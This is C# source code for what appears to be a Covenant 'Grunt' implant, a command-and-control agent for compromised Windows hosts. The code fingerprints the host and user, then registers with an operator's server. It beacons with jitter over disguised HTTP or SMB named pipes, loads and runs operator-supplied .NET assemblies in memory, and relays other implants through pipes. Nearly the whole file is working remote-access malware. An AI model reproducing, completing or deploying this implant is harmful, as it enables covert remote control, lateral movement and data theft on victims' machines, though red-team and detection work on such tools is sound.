using System;
using System.Net;
using System.Linq;
using System.Text;
using System.IO;
using System.IO.Pipes;
using System.IO.Compression;
using System.Threading;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace Grunt
{
    class Grunt
    {
        public static void Execute(string GUID, Aes SessionKey, NamedPipeServerStream pipe = null)
        {
            try
            {
                string CovenantURI = @"{{REPLACE_COVENANT_URI}}";
                string CovenantCertHash = @"{{REPLACE_COVENANT_CERT_HASH}}";
                int Delay = Convert.ToInt32(@"{{REPLACE_DELAY}}");
                int Jitter = Convert.ToInt32(@"{{REPLACE_JITTER}}");
                int ConnectAttempts = Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
				List<string> ProfileHttpHeaderNames = new List<string>();
                List<string> ProfileHttpHeaderValues = new List<string>();
                // {{REPLACE_PROFILE_HTTP_HEADERS}}
				List<string> ProfileHttpUrls = new List<string>();
                // {{REPLACE_PROFILE_HTTP_URLS}}
				List<string> ProfileHttpCookies = new List<string>();
				// {{REPLACE_PROFILE_HTTP_COOKIES}}
				string ProfileHttpGetResponse = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}";
				string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}";
				string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}";

                string IPAddress = Dns.GetHostAddresses(Dns.GetHostName())[0].ToString();
                foreach (IPAddress a in Dns.GetHostAddresses(Dns.GetHostName()))
                {
                    if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        IPAddress = a.ToString();
                        break;
                    }
                }
                string OperatingSystem = Environment.OSVersion.ToString();
                string Process = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
                int Integrity = 2;
                if (Environment.UserName.ToLower() == "system")
                {
                    Integrity = 4;
                }
                else
                {
                    var identity = WindowsIdentity.GetCurrent();
                    if (identity.Owner != identity.User)
                    {
                        Integrity = 3;
                    }
                }
                string UserDomainName = Environment.UserDomainName;
                string UserName = Environment.UserName;

                string RegisterBody = @"{ ""integrity"": " + Integrity + @", ""process"": """ + Process + @""", ""userDomainName"": """ + UserDomainName + @""", ""userName"": """ + UserName + @""", ""delay"": " + Convert.ToString(Delay) + @", ""jitter"": " + Convert.ToString(Jitter) + @", ""connectAttempts"": " + Convert.ToString(ConnectAttempts) + @", ""status"": 0, ""ipAddress"": """ + IPAddress + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
                IMessenger baseMessenger = null;
                if (pipe != null)
                {
                    baseMessenger = new SMBMessenger(pipe);
                }
                else
                {
                    baseMessenger = new HttpMessenger(CovenantURI, CovenantCertHash, ProfileHttpHeaderNames, ProfileHttpHeaderValues, ProfileHttpUrls, ProfileHttpCookies);
                    baseMessenger.Read();
                }
                baseMessenger.Identifier = GUID;
                TaskingMessenger messenger = new TaskingMessenger
                (
                    new MessageCrafter(GUID, SessionKey),
                    baseMessenger,
                    new Profile(ProfileHttpGetResponse, ProfileHttpPostRequest, ProfileHttpPostResponse)
                );
                messenger.WriteTaskingMessage(RegisterBody);
                messenger.SetAuthenticator(messenger.ReadTaskingMessage().message);
                try
                {
                    messenger.WriteTaskingMessage("");
                }
                catch (Exception) {}
                TaskHandler taskSender = new TaskHandler();
                EventHandler<TaskCompletedArgs> taskHandler = (sender, eventArgs) =>
                {
                    messenger.WriteTaskingMessage(eventArgs.output, eventArgs.message.name);
                };
                taskSender.TaskCompleted += taskHandler;
                Random rnd = new Random();
                int ConnectAttemptCount = 0;
                bool alive = true;
                while (alive)
                {
                    Thread.Sleep((Delay + rnd.Next(Jitter)) * 1000);
                    try
                    {
                        GruntTaskingMessage message = messenger.ReadTaskingMessage();
                        if (message != null)
                        {
                            ConnectAttemptCount = 0;
                            if (message.type == GruntTaskingType.Assembly)
                            {
                                string[] pieces = message.message.Split(',');
                                if (pieces.Length > 0)
                                {
                                    object[] parameters = null;
                                    if (pieces.Length > 1) { parameters = new object[pieces.Length - 1]; }
                                    for (int i = 1; i < pieces.Length; i++) { parameters[i - 1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }
                                    byte[] compressedBytes = Convert.FromBase64String(pieces[0]);
                                    byte[] decompressedBytes = Utilities.Decompress(compressedBytes);
                                    Assembly gruntTask = Assembly.Load(decompressedBytes);
                                    // new Thread(() => taskSender.ExecuteTask(gruntTask, parameters, message)).Start();
                                    string output = "";
                                    try
                                    {
                                        var results = gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
                                        if (results != null) { output = (string)results; }
                                        messenger.WriteTaskingMessage(output, message.name);
                                    }
                                    catch (Exception e)
                                    {
                                        messenger.WriteTaskingMessage("TaskHandler Exception: " + e.Message + "\n" + e.StackTrace, message.name);
                                    }
                                }
                            }
                            else if (message.type == GruntTaskingType.Set)
                            {
                                GruntSetTaskingType type = (GruntSetTaskingType)Enum.Parse(typeof(GruntSetTaskingType), message.message.Substring(0, message.message.IndexOf(',')));
                                String val = message.message.Substring(message.message.IndexOf(',') + 1);
                                if (type == GruntSetTaskingType.Delay)
                                {
                                    Delay = int.Parse(val);
                                }
                                else if (type == GruntSetTaskingType.Jitter)
                                {
                                    Jitter = int.Parse(val);
                                }
                                else if (type == GruntSetTaskingType.ConnectAttempts)
                                {
                                    ConnectAttempts = int.Parse(val);
                                }
                            }
                            else if (message.type == GruntTaskingType.Kill)
                            {
                                messenger.WriteTaskingMessage("Killed", message.name);
                                return;
                            }
                            else if (message.type == GruntTaskingType.Connect)
                            {
                                string[] split = message.message.Split(',');
                                messenger.Connect(split[0], split[1]);
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        Console.Error.WriteLine("Exception: " + e.Message + Environment.NewLine + e.StackTrace);
                        ConnectAttemptCount++;
                        if (ConnectAttemptCount >= ConnectAttempts) { return; }
                    }
                }
            }
            catch (Exception e) {
                Console.Error.WriteLine(e.Message); Console.Error.WriteLine(e.StackTrace);
            }
        }
    }

    public class TaskCompletedArgs : EventArgs
    {
        public GruntTaskingMessage message { get; }
        public String output { get; }

        public TaskCompletedArgs(GruntTaskingMessage message, String output)
        {
            this.message = message;
            this.output = output;
        }
    }

    public class TaskHandler
    {
        public event EventHandler<TaskCompletedArgs> TaskCompleted;
        public void ExecuteTask(Assembly task, Object[] parameters, GruntTaskingMessage message)
        {
            string output = "";
            try
            {
                var results = task.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
                if (results != null) { output = (string)results; }
                TaskCompleted?.Invoke(this, new TaskCompletedArgs(message, output));
            }
            catch (Exception e)
            {
                TaskCompleted?.Invoke(this, new TaskCompletedArgs(message, "TaskHandler Exception: " + e.Message + "\n" + e.StackTrace));
            }
        }
    }

    public interface IMessenger
    {
        string Identifier { get; set; }
        string Authenticator { get; set; }
        string Read();
        void Write(string Message);
        void Close();
    }

    public class Profile
    {
        private string GetResponse { get; }
        private string PostRequest { get; }
        private string PostResponse { get; }

        public Profile(string GetResponse, string PostRequest, string PostResponse)
        {
            this.GetResponse = GetResponse;
            this.PostRequest = PostRequest;
            this.PostResponse = PostResponse;
        }

        public GruntEncryptedMessage ParseGetResponse(string Message) { return Parse(this.GetResponse, Message); }
        public GruntEncryptedMessage ParsePostRequest(string Message) { return Parse(this.PostRequest, Message); }
        public GruntEncryptedMessage ParsePostResponse(string Message) { return Parse(this.PostResponse, Message); }
        public string FormatGetResponse(GruntEncryptedMessage Message) { return Format(this.GetResponse, Message); }
        public string FormatPostRequest(GruntEncryptedMessage Message) { return Format(this.PostRequest, Message); }
        public string FormatPostResponse(GruntEncryptedMessage Message) { return Format(this.PostResponse, Message); }

        private static GruntEncryptedMessage Parse(string Format, string Message)
        {
            string json = Common.GruntEncoding.GetString(Utilities.HttpMessageTransform.Invert(
                Utilities.Parse(Message, Format)[0]
            ));
            if (json == null || json.Length < 3)
            {
                return null;
            }
            return GruntEncryptedMessage.FromJson(json);
        }

        private static string Format(string Format, GruntEncryptedMessage Message)
        {
            return String.Format(Format,
                Utilities.HttpMessageTransform.Transform(Common.GruntEncoding.GetBytes(GruntEncryptedMessage.ToJson(Message)))
            );
        }
    }

    public class TaskingMessenger
    {
        private object _UpstreamLock = new object();
        private IMessenger _UpstreamMessenger;
        private IMessenger UpstreamMessenger
        {
            get { return this._UpstreamMessenger; }
            set { this._UpstreamMessenger = value; }
        }
        private MessageCrafter Crafter { get; }
        private Profile Profile { get; }

        protected List<IMessenger> DownstreamMessengers { get; } = new List<IMessenger>();

        public TaskingMessenger(MessageCrafter Crafter, IMessenger Messenger, Profile Profile)
        {
            this.Crafter = Crafter;
            this.UpstreamMessenger = Messenger;
            this.Profile = Profile;
        }

        public GruntTaskingMessage ReadTaskingMessage()
        {
            // TODO: why does this need to be PostResponse?
            string read = "";
            lock (_UpstreamLock)
            {
                read = this.UpstreamMessenger.Read();
            }
            GruntEncryptedMessage gruntMessage = this.Profile.ParsePostResponse(read);
            if (gruntMessage.Type == GruntEncryptedMessage.GruntEncryptedMessageType.Tasking)
            {
                string message = this.Crafter.Retrieve(gruntMessage);
                if (gruntMessage == null || message == null || message == "")
                {
                    return null;
                }
                return GruntTaskingMessage.FromJson(message);
            }
            else
            {
                string json = this.Crafter.Retrieve(gruntMessage);
                GruntEncryptedMessage wrappedMessage = GruntEncryptedMessage.FromJson(json);
                IMessenger relay = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier == wrappedMessage.GUID);
                if (relay != null)
                {
                    // TODO: why does this need to be PostResponse?
                    relay.Write(this.Profile.FormatPostResponse(wrappedMessage));
                }
                return null;
            }
        }

        public void WriteTaskingMessage(string Message, string Meta = "")
        {
            GruntEncryptedMessage gruntMessage = this.Crafter.Create(Message, Meta);
            string uploaded = this.Profile.FormatPostRequest(gruntMessage);
            lock (this._UpstreamLock)
            {
                this.UpstreamMessenger.Write(uploaded);
            }
        }

        public void SetAuthenticator(string Authenticator)
        {
            lock (this._UpstreamLock)
            {
                this.UpstreamMessenger.Authenticator = Authenticator;
            }
        }

        public void Connect(string Hostname, string PipeName)
        {
            IMessenger downstream = new SMBMessenger(Hostname, PipeName);

            string stage0 = downstream.Read();
            GruntEncryptedMessage message = this.Profile.ParsePostRequest(stage0);
            downstream.Identifier = message.GUID.Substring(10);
            new Thread(() => {
                while (true)
                {
                    try
                    {
                        string read = downstream.Read();
                        lock (this._UpstreamLock)
                        {
                            this.UpstreamMessenger.Write(read);
                        }
                    }
                    catch(Exception e)
                    {
                        Console.Error.WriteLine("Thread Exception: " + e.Message + Environment.NewLine + e.StackTrace);
                    }
                }
            }).Start();

            this.DownstreamMessengers.Add(downstream);
            lock (this._UpstreamLock)
            {
                this.UpstreamMessenger.Write(stage0);
            }
        }
    }

    public class SMBMessenger : IMessenger
    {
        public string Identifier { get; set; } = "";
        public string Authenticator { get; set; } = "";

        private object _WritePipeLock = new object();
        private PipeStream Pipe { get; }
        private string PipeName { get; }

        public SMBMessenger(NamedPipeServerStream ServerPipe)
        {
            this.Pipe = ServerPipe;
        }

        public SMBMessenger(string Hostname, string PipeName = "gruntsvc", int Timeout = 5000)
        {
            this.PipeName = PipeName;
            lock (this._WritePipeLock)
            {
                NamedPipeClientStream ClientPipe = new NamedPipeClientStream(Hostname, this.PipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
                ClientPipe.Connect(Timeout);
                ClientPipe.ReadMode = PipeTransmissionMode.Byte;
                this.Pipe = ClientPipe;
            }
        }

        public string Read()
        {
            return Common.GruntEncoding.GetString(this.ReadBytes());
        }

        public void Write(string Message)
        {
            this.WriteBytes(Common.GruntEncoding.GetBytes(Message));
        }

        public void Close()
        {
            this.Pipe.Close();
        }

        private void WriteBytes(byte[] bytes)
        {
            lock (this._WritePipeLock)
            {
                byte[] compressed = Utilities.Compress(bytes);
                byte[] size = new byte[4];
                size[0] = (byte)(compressed.Length >> 24);
                size[1] = (byte)(compressed.Length >> 16);
                size[2] = (byte)(compressed.Length >> 8);
                size[3] = (byte)compressed.Length;
                this.Pipe.Write(size, 0, size.Length);
                var writtenBytes = 0;
                while (writtenBytes < compressed.Length)
                {
                    int bytesToWrite = Math.Min(compressed.Length - writtenBytes, 1024);
                    this.Pipe.Write(compressed, writtenBytes, bytesToWrite);
                    writtenBytes += bytesToWrite;
                }
            }
        }

        private byte[] ReadBytes()
        {
            byte[] size = new byte[4];
            int totalReadBytes = 0;
            do
            {
                totalReadBytes += this.Pipe.Read(size, 0, size.Length);
            } while (totalReadBytes < size.Length);
            int len = (size[0] << 24) + (size[1] << 16) + (size[2] << 8) + size[3];
            
            byte[] buffer = new byte[1024];
            using (var ms = new MemoryStream())
            {
                totalReadBytes = 0;
                int readBytes = 0;
                do
                {
                    readBytes = this.Pipe.Read(buffer, 0, buffer.Length);
                    ms.Write(buffer, 0, readBytes);
                    totalReadBytes += readBytes;
                } while (totalReadBytes < len);
                return Utilities.Decompress(ms.ToArray());
            }
        }
    }

    public class HttpMessenger : IMessenger
    {
        public string Identifier { get; set; } = "";
        public string Authenticator { get; set; } = "";

        private string CookieAuthKeyName { get; }
        private string CovenantURI { get; }
        private CookieWebClient CovenantClient { get; set; } = new CookieWebClient();
        private object _WebClientLock = new object();

        private Random Random { get; set; } = new Random();
        private List<string> ProfileHttpHeaderNames { get; }
        private List<string> ProfileHttpHeaderValues { get; }
        private List<string> ProfileHttpUrls { get; }
        private List<string> ProfileHttpCookies { get; }

        private string ToReadValue { get; set; } = "";

        public HttpMessenger(string CovenantURI, string CovenantCertHash, List<string> ProfileHttpHeaderNames, List<string> ProfileHttpHeaderValues, List<string> ProfileHttpUrls, List<string> ProfileHttpCookies)
        {
            this.CovenantURI = CovenantURI;
            this.ProfileHttpHeaderNames = ProfileHttpHeaderNames;
            this.ProfileHttpHeaderValues = ProfileHttpHeaderValues;
            this.ProfileHttpUrls = ProfileHttpUrls;
            this.ProfileHttpCookies = ProfileHttpCookies;
            this.CookieAuthKeyName = this.ProfileHttpCookies[this.Random.Next(this.ProfileHttpCookies.Count)];

            this.CovenantClient.UseDefaultCredentials = true;
            this.CovenantClient.Proxy = WebRequest.DefaultWebProxy;
            this.CovenantClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
            if (CovenantCertHash != "")
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
                {
                    return cert.GetCertHashString() == CovenantCertHash;
                };
            }
        }

        public string Read()
        {
            if (ToReadValue != "")
            {
                string temp = ToReadValue;
                ToReadValue = "";
                return temp;
            }
            lock (this._WebClientLock)
            {
                this.SetupCookieWebClient();
                return this.CovenantClient.DownloadString(this.CovenantURI + this.GetURL());
            }
        }

        public void Write(string Message)
        {
            lock (this._WebClientLock)
            {
                this.SetupCookieWebClient();
                this.ToReadValue = this.CovenantClient.UploadString(this.CovenantURI + this.GetURL(), Message);
            }
        }

        public void Close() { }

        private string GetURL()
        {
            return this.ProfileHttpUrls[this.Random.Next(this.ProfileHttpUrls.Count)];
        }

        private void SetupCookieWebClient()
        {
            for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
            {
                this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i], ProfileHttpHeaderValues[i]);
            }
            this.CovenantClient.Add(new Cookie(this.CookieAuthKeyName, this.Authenticator, "/", this.CovenantURI.Split(':')[1].Split('/')[2]));
        }
    }

    public class MessageCrafter
    {
        private string GUID { get; }
        private Aes SessionKey { get; }

        public MessageCrafter(string GUID, Aes SessionKey)
        {
            this.GUID = GUID;
            this.SessionKey = SessionKey;
        }

        public GruntEncryptedMessage Create(string Message, string Meta = "")
        {
            return this.Create(Common.GruntEncoding.GetBytes(Message), Meta);
        }

        public GruntEncryptedMessage Create(byte[] Message, string Meta = "")
        {
            byte[] encryptedMessagePacket = Utilities.AesEncrypt(Message, this.SessionKey.Key);
            byte[] encryptionIV = new byte[Common.AesIVLength];
            Buffer.BlockCopy(encryptedMessagePacket, 0, encryptionIV, 0, Common.AesIVLength);
            byte[] encryptedMessage = new byte[encryptedMessagePacket.Length - Common.AesIVLength];
            Buffer.BlockCopy(encryptedMessagePacket, Common.AesIVLength, encryptedMessage, 0, encryptedMessagePacket.Length - Common.AesIVLength);

            byte[] hmac = Utilities.ComputeHMAC(encryptedMessage, SessionKey.Key);
            return new GruntEncryptedMessage
            {
                GUID = this.GUID,
                Meta = Meta,
                EncryptedMessage = Convert.ToBase64String(encryptedMessage),
                IV = Convert.ToBase64String(encryptionIV),
                HMAC = Convert.ToBase64String(hmac)
            };
        }

        public string Retrieve(GruntEncryptedMessage message)
        {
            if (message == null || !message.VerifyHMAC(this.SessionKey.Key))
            {
                return null;
            }
            return Common.GruntEncoding.GetString(Utilities.AesDecrypt(message, SessionKey.Key));
        }
    }

    public class CookieWebClient : WebClient
    {
        public CookieContainer CookieContainer { get; private set; }
        public CookieWebClient()
        {
            this.CookieContainer = new CookieContainer();
        }
        public void Add(Cookie cookie)
        {
            this.CookieContainer.Add(cookie);
        }
        protected override WebRequest GetWebRequest(Uri address)
        {
            var request = base.GetWebRequest(address) as HttpWebRequest;
            if (request == null) return base.GetWebRequest(address);
            request.CookieContainer = CookieContainer;
            return request;
        }
    }

    public enum GruntTaskingType
    {
        Assembly,
        Set,
        Kill,
        Connect
    }

    public enum GruntSetTaskingType
    {
        Delay,
        Jitter,
        ConnectAttempts
    }

    public class GruntTaskingMessage
    {
        public GruntTaskingType type { get; set; }
        public String name { get; set; }
        public String message { get; set; }

        private static string GruntTaskingMessageFormat = @"{{""type"":""{0}"",""name"":""{1}"",""message"":""{2}""}}";
        public static GruntTaskingMessage FromJson(string message)
        {
            List<string> parseList = Utilities.Parse(message, GruntTaskingMessageFormat.Replace("{{", "{").Replace("}}", "}"));
            if (parseList.Count < 3)  { return null; }
            return new GruntTaskingMessage
            {
				type = (GruntTaskingType) Enum.Parse(typeof(GruntTaskingType), parseList[0], true),
                name = parseList[1],
                message = parseList[2]
            };
        }

        public static string ToJson(GruntTaskingMessage message)
        {
            return String.Format(
                GruntTaskingMessageFormat,
                message.type.ToString("D"),
                Utilities.JavaScriptStringEncode(message.name),
                Utilities.JavaScriptStringEncode(message.message)
            );
        }
    }

    public class GruntEncryptedMessage
    {
        public enum GruntEncryptedMessageType
        {
            Routing,
            Tasking
        }

		public string GUID { get; set; } = "";
        public GruntEncryptedMessageType Type { get; set; }
        public string Meta { get; set; } = "";
		public string IV { get; set; } = "";
		public string EncryptedMessage { get; set; } = "";
		public string HMAC { get; set; } = "";

        public bool VerifyHMAC(byte[] Key)
        {
            if (EncryptedMessage == "" || HMAC == "" || Key.Length == 0) { return false; }
            try
            {
                var hashedBytes = Convert.FromBase64String(this.EncryptedMessage);
                return Utilities.VerifyHMAC(hashedBytes, Convert.FromBase64String(this.HMAC), Key);
            }
            catch
            {
                return false;
            }
        }

        private static string GruntEncryptedMessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
        public static GruntEncryptedMessage FromJson(string message)
        {
			List<string> parseList = Utilities.Parse(message, GruntEncryptedMessageFormat.Replace("{{", "{").Replace("}}", "}"));
            if (parseList.Count < 5)  { return null; }
            return new GruntEncryptedMessage
            {
                GUID = parseList[0],
                Type = (GruntEncryptedMessageType)int.Parse(parseList[1]),
                Meta = parseList[2],
                IV = parseList[3],
                EncryptedMessage = parseList[4],
                HMAC = parseList[5]
            };
        }

        public static string ToJson(GruntEncryptedMessage message)
        {
            return String.Format(
                GruntEncryptedMessageFormat,
                Utilities.JavaScriptStringEncode(message.GUID),
                message.Type.ToString("D"),
                Utilities.JavaScriptStringEncode(message.Meta),
                Utilities.JavaScriptStringEncode(message.IV),
                Utilities.JavaScriptStringEncode(message.EncryptedMessage),
                Utilities.JavaScriptStringEncode(message.HMAC)
            );
        }
    }

    public static class Common
    {
        public static int AesIVLength = 16;
        public static CipherMode AesCipherMode = CipherMode.CBC;
        public static PaddingMode AesPaddingMode = PaddingMode.PKCS7;
        public static Encoding GruntEncoding = Encoding.UTF8;
    }

    public static class Utilities
    {
        // Returns IV (16 bytes) + EncryptedData byte array
        public static byte[] AesEncrypt(byte[] data, byte[] key)
        {
            Aes SessionKey = Aes.Create();
            SessionKey.Mode = Common.AesCipherMode;
            SessionKey.Padding = Common.AesPaddingMode;
            SessionKey.GenerateIV();
            SessionKey.Key = key;

            byte[] encrypted = SessionKey.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);
            byte[] result = new byte[SessionKey.IV.Length + encrypted.Length];
            Buffer.BlockCopy(SessionKey.IV, 0, result, 0, SessionKey.IV.Length);
            Buffer.BlockCopy(encrypted, 0, result, SessionKey.IV.Length, encrypted.Length);
            return result;
        }

        // Data should be of format: IV (16 bytes) + EncryptedBytes
        public static byte[] AesDecrypt(byte[] data, byte[] key)
        {
            Aes SessionKey = Aes.Create();
            byte[] iv = new byte[Common.AesIVLength];
            Buffer.BlockCopy(data, 0, iv, 0, Common.AesIVLength);
            SessionKey.IV = iv;
            SessionKey.Key = key;
            byte[] encryptedData = new byte[data.Length - Common.AesIVLength];
            Buffer.BlockCopy(data, Common.AesIVLength, encryptedData, 0, data.Length - Common.AesIVLength);
            byte[] decrypted = SessionKey.CreateDecryptor().TransformFinalBlock(encryptedData, 0, encryptedData.Length);

            return decrypted;
        }

        // Convenience method for decrypting an EncryptedMessagePacket
        public static byte[] AesDecrypt(GruntEncryptedMessage encryptedMessage, byte[] key)
        {
            byte[] iv = Convert.FromBase64String(encryptedMessage.IV);
            byte[] encrypted = Convert.FromBase64String(encryptedMessage.EncryptedMessage);
            byte[] combined = new byte[iv.Length + encrypted.Length];
            Buffer.BlockCopy(iv, 0, combined, 0, iv.Length);
            Buffer.BlockCopy(encrypted, 0, combined, iv.Length, encrypted.Length);

            return AesDecrypt(combined, key);
        }

        public static byte[] ComputeHMAC(byte[] data, byte[] key)
        {
            HMACSHA256 SessionHmac = new HMACSHA256(key);
            return SessionHmac.ComputeHash(data);
        }

        public static bool VerifyHMAC(byte[] hashedBytes, byte[] hash, byte[] key)
        {
            HMACSHA256 hmac = new HMACSHA256(key);
            byte[] calculatedHash = hmac.ComputeHash(hashedBytes);
            // Should do double hmac?
            return Convert.ToBase64String(calculatedHash) == Convert.ToBase64String(hash);
        }

        public static byte[] Compress(byte[] bytes)
        {
            byte[] compressedBytes;
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Compress))
                {
                    deflateStream.Write(bytes, 0, bytes.Length);
                }
                compressedBytes = memoryStream.ToArray();
            }
            return compressedBytes;
        }

        public static byte[] Decompress(byte[] compressed)
        {
            using (MemoryStream inputStream = new MemoryStream(compressed.Length))
            {
                inputStream.Write(compressed, 0, compressed.Length);
                inputStream.Seek(0, SeekOrigin.Begin);
                using (MemoryStream outputStream = new MemoryStream())
                {
                    using (DeflateStream deflateStream = new DeflateStream(inputStream, CompressionMode.Decompress))
                    {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = deflateStream.Read(buffer, 0, buffer.Length)) != 0)
                        {
                            outputStream.Write(buffer, 0, bytesRead);
                        }
                    }
                    return outputStream.ToArray();
                }
            }
        }

        public static List<string> Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{");
			if(format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
            if(format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
            if(format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
            if(format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
            if(format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
            if(format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
            Match match = new Regex(format).Match(data);
            List<string> matches = new List<string>();
			if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
            if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
            if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
            if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
            if (match.Groups["group4"] != null) { matches.Add(match.Groups["group4"].Value); }
            if (match.Groups["group5"] != null) { matches.Add(match.Groups["group5"].Value); }
            return matches;
        }

        // Adapted from https://github.com/mono/mono/blob/master/mcs/class/System.Web/System.Web/HttpUtility.cs
        public static string JavaScriptStringEncode(string value)
        {
            if (String.IsNullOrEmpty(value)) { return String.Empty; }
            int len = value.Length;
            bool needEncode = false;
            char c;
            for (int i = 0; i < len; i++)
            {
                c = value[i];
                if (c >= 0 && c <= 31 || c == 34 || c == 39 || c == 60 || c == 62 || c == 92)
                {
                    needEncode = true;
                    break;
                }
            }
            if (!needEncode) { return value; }

            var sb = new StringBuilder();
            for (int i = 0; i < len; i++)
            {
                c = value[i];
                if (c >= 0 && c <= 7 || c == 11 || c >= 14 && c <= 31 || c == 39 || c == 60 || c == 62)
                {
                    sb.AppendFormat("\\u{0:x4}", (int)c);
                }
                else
                {
                    switch ((int)c)
                    {
                        case 8:
                            sb.Append("\\b");
                            break;
                        case 9:
                            sb.Append("\\t");
                            break;
                        case 10:
                            sb.Append("\\n");
                            break;
                        case 12:
                            sb.Append("\\f");
                            break;
                        case 13:
                            sb.Append("\\r");
                            break;
                        case 34:
                            sb.Append("\\\"");
                            break;
                        case 92:
                            sb.Append("\\\\");
                            break;
                        default:
                            sb.Append(c);
                            break;
                    }
                }
            }
            return sb.ToString();
        }

        // {{REPLACE_PROFILE_HTTP_TRANSFORM}}
    }
}
